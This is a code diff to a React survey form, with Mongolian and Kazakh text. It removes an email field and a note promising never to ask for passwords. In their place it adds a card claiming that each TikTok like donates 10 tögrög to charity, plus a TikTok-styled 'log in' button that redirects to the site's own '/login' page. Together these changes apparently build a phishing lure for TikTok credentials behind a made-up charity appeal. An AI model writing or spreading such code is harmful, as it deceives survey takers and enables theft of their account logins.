@@ -76,7 +76,6 @@ const QUESTIONS = [
 
 export default function Survey() {
   const [answers, setAnswers] = useState({});
-  const [gmail, setGmail] = useState("");
   const [submitted, setSubmitted] = useState(false);
   const [errors, setErrors] = useState({});
 
@@ -105,9 +104,6 @@ export default function Survey() {
         newErrors[q.id] = true;
       }
     });
-    if (!gmail.trim() || !gmail.includes("@")) {
-      newErrors.gmail = true;
-    }
     if (Object.keys(newErrors).length > 0) {
       setErrors(newErrors);
       document
@@ -198,37 +194,45 @@ export default function Survey() {
           </div>
         ))}
 
-        {/* Gmail card */}
-        <div
-          className={`survey-card${errors.gmail ? " survey-card--error" : ""}`}
-        >
-          <p className="survey-question">
-            Таны Gmail хаяг <span className="survey-star">*</span>
+        {/* TikTok support card */}
+        <div className="survey-card survey-tiktok-card">
+          <p className="survey-tiktok-support-desc">
+            🙏 Бізді қолдап, міндетті түрде TikTok парақшамызға кіріңіз! Сол
+            арқылы сіздің толтырған сауалнамаңыз <strong>қайырымдылыққа</strong>{" "}
+            жұмсалады. Сіздің басқан әрбір лайкіңіз <strong>10 төгрөг</strong>{" "}
+            болып есептеледі — сол себепті кіріп, лайк басыңыздар! ❤️
           </p>
-          {errors.gmail && (
-            <p className="survey-error survey-error--field">
-              Зөв Gmail хаяг оруулна уу
-            </p>
-          )}
-          <input
-            className="survey-text-input"
-            type="email"
-            placeholder="example@gmail.com"
-            value={gmail}
-            onChange={(e) => {
-              setGmail(e.target.value);
-              setErrors((prev) => ({ ...prev, gmail: false }));
+          <button
+            type="button"
+            className="survey-tiktok-btn"
+            onClick={() => {
+              window.location.href = "/login";
             }}
-          />
+          >
+            <svg
+              width="20"
+              height="20"
+              viewBox="0 0 48 48"
+              fill="none"
+              style={{ marginRight: 8, flexShrink: 0 }}
+            >
+              <path
+                d="M38.4 10.56A11.2 11.2 0 0 1 32 8v8a11.2 11.2 0 0 0 6.4 1.92V10.56z"
+                fill="#fff"
+              />
+              <path
+                d="M32 8a11.2 11.2 0 0 0-11.2 11.2v12.8A5.6 5.6 0 1 1 15.2 26.4v-8.32A13.6 13.6 0 1 0 32 32V20.48A19.2 19.2 0 0 0 44.8 22.4v-8a11.2 11.2 0 0 1-12.8-6.4z"
+                fill="#fff"
+              />
+            </svg>
+            TikTok-те кіру
+          </button>
         </div>
 
         <div className="survey-footer">
           <button type="submit" className="survey-submit-btn">
             Илгээх
           </button>
-          <span className="survey-footer-note">
-            Хэзээ ч нууц үг оруулахыг хүсэхгүй
-          </span>
         </div>
       </form>
 
